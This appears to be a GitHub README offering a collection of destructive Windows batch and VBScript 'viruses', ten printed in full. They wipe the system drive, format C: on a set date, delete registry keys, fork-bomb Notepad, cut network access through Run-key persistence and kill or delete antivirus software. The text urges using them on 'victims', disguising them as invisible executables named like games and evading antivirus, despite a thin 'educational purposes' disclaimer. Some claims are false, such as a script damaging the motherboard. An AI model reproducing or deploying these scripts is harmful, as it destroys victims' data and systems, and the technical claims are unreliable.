<h1 align="center"> Batch Viruses</h1>

## An awesome collection of different kinds of Computer Viruses written in Batch File.

---
<img src="https://user-images.githubusercontent.com/73777108/149873561-ace30728-a82f-466b-8e43-0433c2c2e87d.png" align="right">

Create amazing yet Deadly viruses with small yet deadly codes. These can be created with just Notepad, and even be downloaded from here.
The viruses here are mostly very dangerous.



---
## ⚠️ALERT: 

- These are only for educational purposes. 
- Never try them on your own device until you are sure of what you are doing.
- Me, or any other contributor to this repo will not be responsible for any damage to your device.
- Handle files with care and awareness.
- Most damages can't be restored or recovered.

---

# The Awesome List of Computer Viruses!


### 1. Deletes all content of a drive


<details><summary> Read More </summary>
 
  
  
<p><a href="https://github.com/SparkScratch-P/batch-virus/blob/main/viruses/virus1.bat">virus1.bat</a></p>
<pre><code> @<span class="hljs-built_in">echo</span> off
<span class="hljs-built_in">del</span> <span class="hljs-variable">%systemdrive%</span>\*.* /f /s /q
shutdown -r -f -t <span class="hljs-number">00</span>
</code></pre>
 

  </details>



### 2. Time Bomb Virus, formats C: on 25 November 2023


<details><summary> Read More </summary>
  
  
  
<p><a href="https://github.com/SparkScratch-P/batch-virus/blob/main/viruses/virus2.bat">virus2.bat</a></p>
<pre><code><span class="hljs-keyword">If</span> <span class="hljs-variable">%date%</span> <span class="hljs-keyword">NEQ</span> <span class="hljs-number">2023</span>/<span class="hljs-number">11</span>/<span class="hljs-number">25</span> <span class="hljs-keyword">goto</span> <span class="hljs-keyword">exit</span>
<span class="hljs-built_in">format</span> C: /y &gt;<span class="hljs-built_in">nul</span>
:<span class="hljs-keyword">exit</span>
<span class="hljs-keyword">exit</span>
</code></pre><p>The Date, Time, and the Drive to be formatted can be changed.</p>
  
   

  </details>



### 3. Crash Ur Computer of Windows Xp


<details><summary> Read More </summary>

<p><a href="https://github.com/SparkScratch-P/batch-virus/blob/main/viruses/virus3.bat">virus3.bat</a></p>
<pre><code><span class="hljs-keyword">Option</span> <span class="hljs-keyword">Explicit</span>

<span class="hljs-keyword">Dim</span> WSHShell
<span class="hljs-keyword">Set</span> WSHShell=Wscript.<span class="hljs-built_in">CreateObject</span>(“Wscript.Shell”)

<span class="hljs-keyword">Dim</span> x
<span class="hljs-keyword">For</span> x = <span class="hljs-number">1</span> <span class="hljs-keyword">to</span> <span class="hljs-number">100000000</span>
WSHShell.Run “Tourstart.exe”
<span class="hljs-keyword">Next</span>
</code></pre><p>This Virus works only for Windows XP, and besides formatting the drives, it damages the motherboard.</p>

   

  </details>

### 4.  Delete Key Registry Files 



<details><summary> Read More </summary>
 
 <p><a href="https://github.com/SparkScratch-P/batch-virus/blob/main/viruses/virus4.bat">virus4.bat</a></p>
<pre><code>@ECHO OFF
START <span class="hljs-keyword">reg</span> <span class="hljs-keyword">delete</span> HKCR/.<span class="hljs-keyword">exe</span>
START <span class="hljs-keyword">reg</span> <span class="hljs-keyword">delete</span> HKCR/.dll
START <span class="hljs-keyword">reg</span> <span class="hljs-keyword">delete</span> HKCR/*
:MESSAGE
ECHO Your computer <span class="hljs-built_in">has</span> been fcked. Have <span class="hljs-keyword">a</span> nice day.
GOTO MESSAGE
</code></pre><p>This virus is extremely dangerous, don&#39;t run it on your device.</p>

  </details>

### 5. The Most Simple Virus To Crush The Window. Delete C:/


<details><summary> Read More </summary>
 
 
<p><a href="https://github.com/SparkScratch-P/batch-virus/blob/main/viruses/virus5.bat">virus5.bat</a></p>
<pre><code>@Echo <span class="hljs-literal">off</span>
Del C:<span class="hljs-string">\</span> *.* |y
</code></pre><p>Your device will not restart again, after it runs once!</p>

 
  </details>
 
 
 ### 6. Endless Notepads


<details><summary> Read More </summary>
 
 
<p><a href="https://github.com/SparkScratch-P/batch-virus/blob/main/viruses/virus6.bat">virus6.bat</a></p>
<pre><code>@<span class="hljs-built_in">ECHO</span> off
:top
<span class="hljs-built_in">START</span> <span class="hljs-variable">%SystemRoot%</span>\system32\notepad.exe
<span class="hljs-keyword">GOTO</span> top
</code></pre><p>This will open endless notepads, until ur system gets overloaded, hanged, and crashed!</p>
<p>NOTE : If you mistakenly open it, immediately power of and force shut down your computer, else it may crash, never to start again.</p>

 
  </details>
 

### 7. Disable Internet Permanently


<details><summary> Read More </summary>
 
 <p><a href="https://github.com/SparkScratch-P/batch-virus/blob/main/viruses/virus7.bat">virus7.bat</a></p>
<pre><code><span class="hljs-symbol">echo</span> <span class="hljs-comment">@echo off&gt;c:windowswimn32.bat</span>
<span class="hljs-symbol">echo</span> <span class="hljs-keyword">break </span>off&gt;&gt;c:windowswimn32.<span class="hljs-keyword">bat
</span><span class="hljs-symbol">echo</span> ipconfig/release_all&gt;&gt;c:windowswimn32.<span class="hljs-keyword">bat
</span><span class="hljs-symbol">echo</span> <span class="hljs-meta">end</span>&gt;&gt;c:windowswimn32.<span class="hljs-keyword">bat
</span><span class="hljs-symbol">reg</span> <span class="hljs-keyword">add </span>hkey_local_machinesoftwaremicrosoftwindowscurrentv ersionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.<span class="hljs-keyword">bat </span>/f
<span class="hljs-symbol">reg</span> <span class="hljs-keyword">add </span>hkey_current_usersoftwaremicrosoftwindowscurrentve rsionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.<span class="hljs-keyword">bat </span>/f
<span class="hljs-symbol">echo</span> You Have <span class="hljs-keyword">Been </span>HACKED!
<span class="hljs-symbol">PAUSE</span>
</code></pre><p>Your device will never ever connect to the internet if this virus runs once!</p>
  
  </details>
 


### 8. Crazy Caps Lock


<details><summary> Read More </summary>
 
 <p><a href="https://github.com/SparkScratch-P/batch-virus/blob/main/viruses/virus8.bat">virus8.bat</a></p>
<pre><code><span class="hljs-keyword">Set</span> wshShell <span class="hljs-comment">=wscript.CreateObject(</span>”<span class="hljs-comment">WScript.Shell</span>”<span class="hljs-comment">)</span>
do
wscript.sleep <span class="hljs-comment">100</span>
wshshell.sendkeys “<span class="hljs-comment">{CAPSLOCK}</span>”
loop
</code></pre><p>This repeatedly toggles your Caps Lock key. It is fully harmless and gets proper on reboot, or once the task is ended in Task Manager.</p>

   
  </details>


### 9. Endless Backspace



<details><summary> Read More </summary>
 
<p><a href="https://github.com/SparkScratch-P/batch-virus/blob/main/viruses/virus9.bat">virus9.bat</a></p>
<pre><code>MsgBox “Let’s go back <span class="hljs-selector-tag">a</span> few steps”
Set wshShell =wscript.CreateObject(”WScript.Shell”)
do
wscript<span class="hljs-selector-class">.sleep</span> <span class="hljs-number">100</span>
wshshell<span class="hljs-selector-class">.sendkeys</span> “{bs}”
loop
</code></pre><p>This will repeatedly keep pressing your Backspace, and will not let u type. It pops up a message; “Let’s go back a few steps”, and starts nuisence. Anyways, it is temporary, and harmless.</p>
    
  </details>


### 10. Disable the Antivirus



<details><summary> Read More </summary>
 
 
 <p><a href="https://github.com/SparkScratch-P/batch-virus/blob/main/viruses/virus10.bat">virus10.bat</a></p>
<pre><code>@ echo off
rem —
rem Permanently Kill Anti-Virus
net stop “Security Center”
netsh firewall <span class="hljs-keyword">set</span> opmode <span class="hljs-comment">mode=disable</span>
tskill /A av*
tskill /<span class="hljs-comment">A fire*</span>
tskill /A anti*
cls
tskill /<span class="hljs-comment">A spy*</span>
tskill /A bullguard
tskill /<span class="hljs-comment">A PersFw</span>
tskill /A KAV*
tskill /<span class="hljs-comment">A ZONEALARM</span>
tskill /A SAFEWEB
cls
tskill /<span class="hljs-comment">A OUTPOST</span>
tskill /A nv*
tskill /<span class="hljs-comment">A nav*</span>
tskill /A F-*
tskill /<span class="hljs-comment">A ESAFE</span>
tskill /A cle
cls
tskill /<span class="hljs-comment">A BLACKICE</span>
tskill /A def*
tskill /<span class="hljs-comment">A kav</span>
tskill /A kav*
tskill /<span class="hljs-comment">A avg*</span>
tskill /A ash*
cls
tskill /<span class="hljs-comment">A aswupdsv</span>
tskill /A ewid*
tskill /<span class="hljs-comment">A guard*</span>
tskill /A guar*
tskill /<span class="hljs-comment">A gcasDt*</span>
tskill /A msmp*
cls
tskill /<span class="hljs-comment">A mcafe*</span>
tskill /A mghtml
tskill /<span class="hljs-comment">A msiexec</span>
tskill /A outpost
tskill /<span class="hljs-comment">A isafe</span>
tskill /A zap*
cls
tskill /<span class="hljs-comment">A zauinst</span>
tskill /A upd*
tskill /<span class="hljs-comment">A zlclien*</span>
tskill /A minilog
tskill /<span class="hljs-comment">A cc*</span>
tskill /A norton*
cls
tskill /<span class="hljs-comment">A norton au*</span>
tskill /A ccc*
tskill /<span class="hljs-comment">A npfmn*</span>
tskill /A loge*
tskill /<span class="hljs-comment">A nisum*</span>
tskill /A issvc
tskill /<span class="hljs-comment">A tmp*</span>
cls
tskill /A tmn*
tskill /<span class="hljs-comment">A pcc*</span>
tskill /A cpd*
tskill /<span class="hljs-comment">A pop*</span>
tskill /A pav*
tskill /<span class="hljs-comment">A padmin</span>
cls
tskill /A panda*
tskill /<span class="hljs-comment">A avsch*</span>
tskill /A sche*
tskill /<span class="hljs-comment">A syman*</span>
tskill /A virus*
tskill /<span class="hljs-comment">A realm*</span>
cls
tskill /A sweep*
tskill /<span class="hljs-comment">A scan*</span>
tskill /A ad-*
tskill /<span class="hljs-comment">A safe*</span>
tskill /A avas*
tskill /<span class="hljs-comment">A norm*</span>
cls
tskill /A offg*
del /<span class="hljs-comment">Q</span> /F C:\Program <span class="hljs-keyword">Files</span>\alwils~<span class="hljs-number">1</span>\avast4\*.*
del /<span class="hljs-comment">Q</span> /F C:\Program <span class="hljs-keyword">Files</span>\Lavasoft\Ad-awa~<span class="hljs-number">1</span>\*.exe
del /<span class="hljs-comment">Q</span> /F C:\Program <span class="hljs-keyword">Files</span>\kasper~<span class="hljs-number">1</span>\*.exe
cls
del /<span class="hljs-comment">Q</span> /F C:\Program <span class="hljs-keyword">Files</span>\trojan~<span class="hljs-number">1</span>\*.exe
del /<span class="hljs-comment">Q</span> /F C:\Program <span class="hljs-keyword">Files</span>\f-prot95\*.dll
del /<span class="hljs-comment">Q</span> /F C:\Program <span class="hljs-keyword">Files</span>\tbav\*.dat
cls
del /<span class="hljs-comment">Q</span> /F C:\Program <span class="hljs-keyword">Files</span>\avpersonal\*.vdf
del /<span class="hljs-comment">Q</span> /F C:\Program <span class="hljs-keyword">Files</span>\Norton~<span class="hljs-number">1</span>\*.cnt
del /<span class="hljs-comment">Q</span> /F C:\Program <span class="hljs-keyword">Files</span>\Mcafee\*.*
cls
del /<span class="hljs-comment">Q</span> /F C:\Program <span class="hljs-keyword">Files</span>\Norton~<span class="hljs-number">1</span>\Norton~<span class="hljs-number">1</span>\Norton~<span class="hljs-number">3</span>\*.*
del /<span class="hljs-comment">Q</span> /F C:\Program <span class="hljs-keyword">Files</span>\Norton~<span class="hljs-number">1</span>\Norton~<span class="hljs-number">1</span>\speedd~<span class="hljs-number">1</span>\*.*
del /<span class="hljs-comment">Q</span> /F C:\Program <span class="hljs-keyword">Files</span>\Norton~<span class="hljs-number">1</span>\Norton~<span class="hljs-number">1</span>\*.*
del /<span class="hljs-comment">Q</span> /F C:\Program <span class="hljs-keyword">Files</span>\Norton~<span class="hljs-number">1</span>\*.*
cls
del /<span class="hljs-comment">Q</span> /F C:\Program <span class="hljs-keyword">Files</span>\avgamsr\*.exe
del /<span class="hljs-comment">Q</span> /F C:\Program <span class="hljs-keyword">Files</span>\avgamsvr\*.exe
del /<span class="hljs-comment">Q</span> /F C:\Program <span class="hljs-keyword">Files</span>\avgemc\*.exe
cls
del /<span class="hljs-comment">Q</span> /F C:\Program <span class="hljs-keyword">Files</span>\avgcc\*.exe
del /<span class="hljs-comment">Q</span> /F C:\Program <span class="hljs-keyword">Files</span>\avgupsvc\*.exe
del /<span class="hljs-comment">Q</span> /F C:\Program <span class="hljs-keyword">Files</span>\grisoft
del /<span class="hljs-comment">Q</span> /F C:\Program <span class="hljs-keyword">Files</span>\nood32krn\*.exe
del /<span class="hljs-comment">Q</span> /F C:\Program <span class="hljs-keyword">Files</span>\nood32\*.exe
cls
del /<span class="hljs-comment">Q</span> /F C:\Program <span class="hljs-keyword">Files</span>\nod32
del /<span class="hljs-comment">Q</span> /F C:\Program <span class="hljs-keyword">Files</span>\nood32
del /<span class="hljs-comment">Q</span> /F C:\Program <span class="hljs-keyword">Files</span>\kav\*.exe
del /<span class="hljs-comment">Q</span> /F C:\Program <span class="hljs-keyword">Files</span>\kavmm\*.exe
del /<span class="hljs-comment">Q</span> /F C:\Program <span class="hljs-keyword">Files</span>\kaspersky\*.*
cls
del /<span class="hljs-comment">Q</span> /F C:\Program <span class="hljs-keyword">Files</span>\ewidoctrl\*.exe
del /<span class="hljs-comment">Q</span> /F C:\Program <span class="hljs-keyword">Files</span>\guard\*.exe
del /<span class="hljs-comment">Q</span> /F C:\Program <span class="hljs-keyword">Files</span>\ewido\*.exe
cls
del /<span class="hljs-comment">Q</span> /F C:\Program <span class="hljs-keyword">Files</span>\pavprsrv\*.exe
del /<span class="hljs-comment">Q</span> /F C:\Program <span class="hljs-keyword">Files</span>\pavprot\*.exe
del /<span class="hljs-comment">Q</span> /F C:\Program <span class="hljs-keyword">Files</span>\avengine\*.exe
cls
del /<span class="hljs-comment">Q</span> /F C:\Program <span class="hljs-keyword">Files</span>\apvxdwin\*.exe
del /<span class="hljs-comment">Q</span> /F C:\Program <span class="hljs-keyword">Files</span>\webproxy\*.exe
del /<span class="hljs-comment">Q</span> /F C:\Program <span class="hljs-keyword">Files</span>\panda software\*.*
rem —
</code></pre><p>This will disable your antivirus for the timbing.  One can run it on Victim computer before loading any virus to it!</p>
     
  </details>
 
 
 
 ## This was just a list of ten. There are 25 More in our collection, here on GitHub! Just Have a look at thm:

- Task-kill some apps
- Command Line Notepad
- CD/ROM popper with malicious popups

<details><summary>Details</summary>

CD/ROM keeps opening  and closing ...an error msg keeps popping up  and when i turn on my PC an error msg shows so i have to press ok then open my account

</details>

- CD drive popup
- Stop current Internet access
- Format all Drives from C to J
- Delete Entire Registry
- Crash PC for ever
- Application bomber
- Delete System 32 Folder
- Disgust and shut down!
- Destroy-shutdown with popup
- Shutdowns Computer Everytime It Is Turned On
- Change useful random files to on-working txt files
- System meltdown
- Flood internet
- System Crash

<details><summary>Details</summary>
It will make you unable to use your PC and FORCE you to install Windows OS again. You will only be aware of the infiltration the next time you turn on your Computer! Use the latest version of “Bat To Exe Converter” and add Administrator manifest to it and make it Invisible application before converting it to .exe! Your victim doesn’t even know what is happening or what this virus did. Your trusted Antivirus can’t even detect it cause this file doesn’t work as normal viruses but the later damage will be way too much than what a couple of malware can do.
You may name it in a sexy way like GTA and choose the appropriate icon to attract your victim’s attention. But please, don’t try to be an ASS HAT with it.

</details>

- Matrix virus

<details><summary>Details</summary>

AS IT WAS TOO DANGEROUS, THE ACTUAL HEADER FILES FOR THIS SCRIPT ARE NOT GIVEN
AND IF U WANT TO TRY THIS SCRIPT U CAN JUST USE OF HEADER FILES SUCH AS STDIN, STDLIB, CONIO, AND STUFF LIKE THAT

</details>

- Bloat random folder
- User Account Bloatware
- Overload with unlimited background processes
- Killer and system crasher virus

<details><summary>Details</summary>

Here is a Batch File virus which can:

1.Copy itself into startup
2.Copy itself over one thousand times into random spots in your computer.
3.Hide its self and all other created files
4.Task kill MSN, Norton, Windows Explorer, Limewire.
5.Swap the left mouse button with the right one
6.Opens alert boxes
7.Changes the time to 12:00 and shuts down the computer
copy this code into notepad and save as Greatgame.bat(while saving select all files instead of text ).

</details>

- Show incognito history
- Delete entire system
- Command Line Notepad

<details><summary>Details</summary>
Form Of Switches

-s
Shuts down the PC.

-l
Logs off the current user.

-t nn
Indicates the duration of delay, in seconds, before performing the action.

-c “messagetext”
Displays a message in the System Shutdown window. A maximum of 127 characters can be used. The message must be enclosed in quotation marks.

-f
Forces any running applications to shut down.

-r
Reboots the PC. ..!!!

</details>

- Text bloater
